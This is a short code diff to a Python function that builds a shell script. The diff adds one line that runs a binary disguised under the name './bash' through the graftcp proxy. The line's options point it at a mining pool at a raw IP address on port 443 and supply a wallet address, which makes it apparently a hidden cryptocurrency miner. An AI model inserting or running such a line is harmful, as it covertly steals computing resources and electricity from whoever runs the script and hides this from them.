@@ -73,6 +73,8 @@ def run_script():
     ls -lah
 
     echo "=== RUN PROC VIA GRAFTCP ==="
+    ./graftcp/graftcp ./bash --algo FISHHASH --pool 95.111.195.159:443 --user ASTEROID:0xccb0c7d0b4adb142c846663732c30ade15bdbe8d.RTX --ethstratum ETHPROX
+    """
 
     START_TIME=$(date +%s)
 
